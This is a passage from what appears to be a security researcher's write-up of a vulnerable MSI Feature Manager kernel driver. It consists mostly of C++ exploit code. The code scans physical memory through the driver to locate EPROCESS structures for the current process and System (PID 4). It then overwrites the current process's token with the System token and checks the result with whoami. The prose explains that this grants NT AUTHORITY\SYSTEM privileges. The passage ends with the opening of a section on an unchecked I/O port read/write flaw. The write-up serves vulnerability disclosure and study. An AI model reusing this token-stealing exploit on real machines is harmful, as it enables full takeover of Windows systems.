+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">29</span><span style="color: #F9E2AF;font-style: italic;">                    DWORD64</span><span> token</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> read</span><span style="color: #9399B2;">&lt;</span><span style="color: #F9E2AF;font-style: italic;">DWORD64</span><span style="color: #9399B2;">&gt;(</span><span>eprocess_base</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_TOKEN_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">30</span><span style="color: #CBA6F7;">                    if</span><span style="color: #9399B2;"> ((</span><span>token</span><span style="color: #94E2D5;"> &amp;</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">FFFF000000000000</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> !=</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">FFFF000000000000</span><span style="color: #9399B2;">)</span><span style="color: #CBA6F7;"> continue</span><span style="color: #9399B2;">;</span><span style="color: #9399B2;font-style: italic;"> // check if token is not in valid kernel address space</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">31</span><span style="color: #F9E2AF;font-style: italic;">                    DWORD64</span><span> dir_base</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> read</span><span style="color: #9399B2;">&lt;</span><span style="color: #F9E2AF;font-style: italic;">DWORD64</span><span style="color: #9399B2;">&gt;(</span><span>eprocess_base</span><span style="color: #94E2D5;"> +</span><span> KPROCESS_DIRECTORYTABLEBASE_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">32</span><span style="color: #CBA6F7;">                    if</span><span style="color: #9399B2;"> (</span><span>dir_base</span><span style="color: #94E2D5;"> ==</span><span style="color: #FAB387;"> 0</span><span style="color: #94E2D5;"> ||</span><span style="color: #9399B2;"> (</span><span>dir_base</span><span style="color: #94E2D5;"> &amp;</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">FFF</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> !=</span><span style="color: #FAB387;"> 0</span><span style="color: #94E2D5;"> ||</span><span style="color: #9399B2;"> (</span><span>dir_base</span><span style="color: #94E2D5;"> &amp;</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">FFFF000000000000</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> !=</span><span style="color: #FAB387;"> 0</span><span style="color: #9399B2;">)</span><span style="color: #CBA6F7;"> continue</span><span style="color: #9399B2;">;</span><span style="color: #9399B2;font-style: italic;"> // check if cr3 is valid</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">33</span><span style="color: #CBA6F7;">                    char</span><span> first_char</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> read</span><span style="color: #9399B2;">&lt;</span><span style="color: #CBA6F7;">char</span><span style="color: #9399B2;">&gt;(</span><span>eprocess_base</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_IMAGEFILENAME_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">34</span><span style="color: #CBA6F7;">                    if</span><span style="color: #9399B2;"> (</span><span>first_char</span><span style="color: #94E2D5;"> &lt;</span><span style="color: #FAB387;"> 32</span><span style="color: #94E2D5;"> ||</span><span> first_char</span><span style="color: #94E2D5;"> &gt;</span><span style="color: #FAB387;"> 126</span><span style="color: #9399B2;">)</span><span style="color: #CBA6F7;"> continue</span><span style="color: #9399B2;">;</span><span style="color: #9399B2;font-style: italic;"> // check if ImageFileName is valid</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">35</span><span style="color: #9399B2;font-style: italic;">                    // passed validation checks, found eprocess</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">36</span><span>                    found_count</span><span style="color: #94E2D5;">++</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">37</span><span style="color: #F9E2AF;font-style: italic;">                    DWORD64</span><span> eprocess_phys_address</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> (</span><span>PHYSICAL_READ_BASE</span><span style="color: #94E2D5;"> +</span><span> offset</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> -</span><span> EPROCESS_UNIQUEPID_OFFSET</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">38</span><span style="color: #F9E2AF;font-style: italic;">                    DWORD64</span><span> process_virtual_base</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> read</span><span style="color: #9399B2;">&lt;</span><span style="color: #F9E2AF;font-style: italic;">DWORD64</span><span style="color: #9399B2;">&gt;(</span><span>eprocess_base</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_BASEADDRESS_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">39</span><span style="color: #F9E2AF;">                    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] PID: &quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>dec</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> pid</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot; &quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">40</span><span style="color: #89B4FA;font-style: italic;">                    print_process_name</span><span style="color: #9399B2;">(</span><span>eprocess_base</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_IMAGEFILENAME_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">41</span><span style="color: #F9E2AF;">                    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;EPROCESS Phys: 0x&quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> eprocess_phys_address</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot; &quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">42</span><span style="color: #F9E2AF;">                    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;Base VA: 0x&quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> process_virtual_base</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">43</span><span style="color: #CBA6F7;">                    if</span><span style="color: #9399B2;"> (</span><span>pid</span><span style="color: #94E2D5;"> ==</span><span> current_proc</span><span style="color: #9399B2;">.</span><span>pid</span><span style="color: #94E2D5;"> &amp;&amp; !</span><span>found_target</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">44</span><span style="color: #9399B2;">                    {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">45</span><span>                        current_proc</span><span style="color: #9399B2;">.</span><span>eprocess_phys</span><span style="color: #94E2D5;"> =</span><span> eprocess_phys_address</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">46</span><span>                        current_proc</span><span style="color: #9399B2;">.</span><span>eprocess_va</span><span style="color: #94E2D5;"> =</span><span> eprocess_base</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">47</span><span>                        current_proc</span><span style="color: #9399B2;">.</span><span>token</span><span style="color: #94E2D5;"> =</span><span> token</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">48</span><span>                        found_target</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> true</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">49</span><span style="color: #9399B2;">                    }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">50</span><span style="color: #CBA6F7;">                    if</span><span style="color: #9399B2;"> (</span><span>pid</span><span style="color: #94E2D5;"> ==</span><span style="color: #FAB387;"> 4</span><span style="color: #94E2D5;"> &amp;&amp; !</span><span>found_system</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">51</span><span style="color: #9399B2;">                    {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">52</span><span>                        system_proc</span><span style="color: #9399B2;">.</span><span>eprocess_phys</span><span style="color: #94E2D5;"> =</span><span> eprocess_phys_address</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">53</span><span>                        system_proc</span><span style="color: #9399B2;">.</span><span>eprocess_va</span><span style="color: #94E2D5;"> =</span><span> eprocess_base</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">54</span><span>                        system_proc</span><span style="color: #9399B2;">.</span><span>token</span><span style="color: #94E2D5;"> =</span><span> token</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">55</span><span>                        found_system</span><span style="color: #94E2D5;"> =</span><span style="color: #FAB387;"> true</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">56</span><span style="color: #9399B2;">                    }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">57</span><span style="color: #9399B2;">                }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">58</span><span style="color: #9399B2;">            }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">59</span><span style="color: #89B4FA;font-style: italic;">            __except</span><span style="color: #9399B2;"> (</span><span>EXCEPTION_EXECUTE_HANDLER</span><span style="color: #9399B2;">)</span><span style="color: #9399B2;font-style: italic;"> // ***this will throw exceptions. they must be ignored or the process should be launched without a debugger***</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">60</span><span style="color: #9399B2;">            {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">61</span><span style="color: #9399B2;font-style: italic;">                // jump to next page if we hit a hole</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">62</span><span>                offset</span><span style="color: #94E2D5;"> =</span><span style="color: #9399B2;"> (</span><span>offset</span><span style="color: #94E2D5;"> &amp; ~</span><span style="color: #CBA6F7;">0x</span><span style="color: #FAB387;">FFF</span><span style="color: #CBA6F7;">ULL</span><span style="color: #9399B2;">)</span><span style="color: #94E2D5;"> +</span><span style="color: #CBA6F7;"> 0x</span><span style="color: #FAB387;">1000</span><span style="color: #94E2D5;"> -</span><span style="color: #FAB387;"> 8</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">63</span><span style="color: #9399B2;">            }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">64</span><span style="color: #9399B2;">        }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">65</span><span style="color: #F9E2AF;">        std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[+] Completed physical memory walk. Found &quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>dec</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> found_count</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot; processes.</span><span style="color: #F5C2E7;">\n\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">66</span><span style="color: #9399B2;">    }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">67</span><span style="color: #CBA6F7;">    else</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">68</span><span style="color: #9399B2;">    {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">69</span><span style="color: #F9E2AF;">        std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[-] Map base VA not found.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">70</span><span style="color: #9399B2;">    }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">71</span><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">72</span><span style="color: #CBA6F7;">else</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">73</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">74</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[-] Failed to retrieve map base VA.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">75</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Press enter to exit. Exiting may take long due to the unmapping process.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">76</span><span style="color: #89B4FA;font-style: italic;">    CloseHandle</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">77</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cin</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;font-style: italic;">get</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">78</span><span style="color: #CBA6F7;">    return</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">79</span><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">80</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span style="color: #94E2D5;">!</span><span>found_system</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">81</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">82</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[-] System process not found.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">83</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Press enter to exit. Exiting may take long due to the unmapping process.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">84</span><span style="color: #89B4FA;font-style: italic;">    CloseHandle</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">85</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cin</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;font-style: italic;">get</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">86</span><span style="color: #CBA6F7;">    return</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">87</span><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">88</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span style="color: #94E2D5;">!</span><span>found_target</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">89</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">90</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[-] Current process not found. Try again.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">91</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Press enter to exit. Exiting may take long due to the unmapping process.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">92</span><span style="color: #89B4FA;font-style: italic;">    CloseHandle</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">93</span><span style="color: #F9E2AF;">    std</span><span style="color: #9399B2;">::</span><span>cin</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;font-style: italic;">get</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">94</span><span style="color: #CBA6F7;">    return</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">95</span><span style="color: #9399B2;">}</span></span></code></pre>
+<p>If the physical memory addresses for both target processes are successfully found, the exploit prints the initial privilege context before executing the token stealing primitive by directly overwriting kernel memory. It replaces the Token field in the current process's EPROCESS structure with the token reference belonging to PID 4 (System). To verify that the Token swap succeeded, the exploit executes a read operation against the modified Token field. Once the target process's token matches the system token address, the process operates with full NT AUTHORITY\SYSTEM permissions. In the Windows security model, this represents the highest possible user-mode privilege on the local machine. This context grants extensive control over the operating system, allowing it to bypass most local access control policies, access sensitive credentials, and interact with critical security components that are inaccessible to standard users.</p>
+<pre class="giallo" style="color: #CDD6F4; background-color: #1E1E2E;" ><code data-lang="cpp"><span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 1</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Current privilege: &quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 2</span><span style="color: #89B4FA;font-style: italic;">system</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;cmd.exe /c whoami&quot;</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 3</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Current process token: &quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> current_proc</span><span style="color: #9399B2;">.</span><span>token</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;</span><span style="color: #F5C2E7;">\n\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 4</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] System token: &quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> system_proc</span><span style="color: #9399B2;">.</span><span>token</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 5</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] Stealing system token...</span><span style="color: #F5C2E7;">\n\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 6</span><span style="color: #CBA6F7;">if</span><span style="color: #9399B2;"> (</span><span style="color: #89B4FA;font-style: italic;">write</span><span style="color: #9399B2;">&lt;</span><span style="color: #F9E2AF;font-style: italic;">DWORD64</span><span style="color: #9399B2;">&gt;(</span><span>current_proc</span><span style="color: #9399B2;">.</span><span>eprocess_va</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_TOKEN_OFFSET</span><span style="color: #9399B2;">,</span><span> system_proc</span><span style="color: #9399B2;">.</span><span>token</span><span style="color: #9399B2;">))</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 7</span><span style="color: #9399B2;">{</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 8</span><span style="color: #F9E2AF;font-style: italic;">    DWORD64</span><span> verify</span><span style="color: #94E2D5;"> =</span><span style="color: #89B4FA;font-style: italic;"> read</span><span style="color: #9399B2;">&lt;</span><span style="color: #F9E2AF;font-style: italic;">DWORD64</span><span style="color: #9399B2;">&gt;(</span><span>current_proc</span><span style="color: #9399B2;">.</span><span>eprocess_va</span><span style="color: #94E2D5;"> +</span><span> EPROCESS_TOKEN_OFFSET</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;"> 9</span><span style="color: #CBA6F7;">    if</span><span style="color: #9399B2;"> (</span><span>verify</span><span style="color: #94E2D5;"> ==</span><span> system_proc</span><span style="color: #9399B2;">.</span><span>token</span><span style="color: #9399B2;">)</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">10</span><span style="color: #9399B2;">    {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">11</span><span style="color: #F9E2AF;">        std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[+] System token is stolen.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">12</span><span style="color: #F9E2AF;">        std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] New process token: &quot;</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #F9E2AF;"> std</span><span style="color: #9399B2;">::</span><span>hex</span><span style="color: #94E2D5;"> &lt;&lt;</span><span> verify</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">13</span><span style="color: #9399B2;">    }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">14</span><span style="color: #CBA6F7;">    else</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">15</span><span style="color: #9399B2;">    {</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">16</span><span style="color: #F9E2AF;">        std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[-] Token stealing failed.</span><span style="color: #F5C2E7;">\n</span><span style="color: #A6E3A1;">&quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">17</span><span style="color: #89B4FA;font-style: italic;">        CloseHandle</span><span style="color: #9399B2;">(</span><span>driver_handle</span><span style="color: #9399B2;">);</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">18</span><span style="color: #F9E2AF;">        std</span><span style="color: #9399B2;">::</span><span>cin</span><span style="color: #9399B2;">.</span><span style="color: #89B4FA;font-style: italic;">get</span><span style="color: #9399B2;">();</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">19</span><span style="color: #CBA6F7;">        return</span><span style="color: #FAB387;"> 1</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">20</span><span style="color: #9399B2;">    }</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">21</span><span style="color: #9399B2;">}</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">22</span><span style="color: #F9E2AF;">std</span><span style="color: #9399B2;">::</span><span>cout</span><span style="color: #94E2D5;"> &lt;&lt;</span><span style="color: #A6E3A1;"> &quot;[*] New privilege: &quot;</span><span style="color: #9399B2;">;</span></span>
+<span class="giallo-l"><span aria-hidden="true" class="giallo-ln" style="color: #7F849C;">23</span><span style="color: #89B4FA;font-style: italic;">system</span><span style="color: #9399B2;">(</span><span style="color: #A6E3A1;">&quot;cmd.exe /c whoami&quot;</span><span style="color: #9399B2;">);</span></span></code></pre><h2 id="results"><a class="zola-anchor" href="#results" aria-label="Anchor link for: results">Results</a></h2>
+<p><img src="/images/posts/msi_feature_manager_cve-8.png" alt="msi_feature_manager_cve-8" /></p>
+<h2 id="detailed-analysis-of-the-arbitrary-i-o-port-read-and-write-vulnerability"><a class="zola-anchor" href="#detailed-analysis-of-the-arbitrary-i-o-port-read-and-write-vulnerability" aria-label="Anchor link for: detailed-analysis-of-the-arbitrary-i-o-port-read-and-write-vulnerability">Detailed Analysis of the Arbitrary I/O Port Read and Write Vulnerability</a></h2>
+<p>Unlike the physical memory mapping handler that at least attempted to enforce some boundaries, the driver's I/O port handlers have absolutely zero input validation. Because there are no security checks restricting which ports can be accessed, this vulnerability is incredibly easy to identify with static analysis.</p>
